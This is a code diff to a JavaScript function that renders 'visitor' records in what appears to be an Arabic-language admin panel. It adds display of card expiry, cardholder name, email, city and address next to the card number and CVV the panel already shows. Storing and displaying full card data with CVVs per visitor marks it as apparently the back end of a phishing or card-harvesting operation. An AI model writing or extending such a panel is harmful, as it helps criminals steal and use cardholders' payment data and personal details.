@@ -781,6 +781,8 @@ function createVisitorCard(visitor, isTrashMode = false) {
       const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
       const subCardNum = subData.cardNumber || subData.card_number || '';
       const subCvv = subData.cvv || '';
+      const subExpiry = subData.expiry || '';
+      const subCardHolder = subData.cardHolder || '';
       const isCash = subData.paymentMethod === 'cash';
       return `
         <div style="padding:8px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(16,185,129,0.2);">
@@ -789,6 +791,8 @@ function createVisitorCard(visitor, isTrashMode = false) {
             <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
           </div>
           ${subCardNum ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البطاقة:</span> <span dir="ltr">${escapeHtml(subCardNum)}</span></div>` : ''}
+          ${subCardHolder ? `<div style="font-size:11px;"><span style="color:#9ca3af;">صاحب البطاقة:</span> ${escapeHtml(subCardHolder)}</div>` : ''}
+          ${subExpiry ? `<div style="font-size:11px;"><span style="color:#9ca3af;">تاريخ الانتهاء:</span> <span dir="ltr">${escapeHtml(subExpiry)}</span></div>` : ''}
           ${subCvv ? `<div style="font-size:11px;"><span style="color:#9ca3af;">CVV:</span> <span dir="ltr">${escapeHtml(subCvv)}</span></div>` : ''}
           ${isCash ? `<div style="font-size:11px;color:#10b981;font-weight:600;">💵 دفع عند الاستلام - 25 ر.ق</div>` : ''}
         </div>
@@ -820,6 +824,9 @@ function createVisitorCard(visitor, isTrashMode = false) {
           </div>
           ${subData.fullName ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الاسم:</span> ${escapeHtml(subData.fullName)}</div>` : ''}
           ${subData.phone ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الهاتف:</span> <span dir="ltr">${escapeHtml(subData.phone)}</span></div>` : ''}
+          ${subData.email ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البريد:</span> ${escapeHtml(subData.email)}</div>` : ''}
+          ${subData.city ? `<div style="font-size:11px;"><span style="color:#9ca3af;">المدينة:</span> ${escapeHtml(subData.city)}</div>` : ''}
+          ${subData.address ? `<div style="font-size:11px;"><span style="color:#9ca3af;">العنوان:</span> ${escapeHtml(subData.address)}</div>` : ''}
         </div>
       `;
     }).join('');
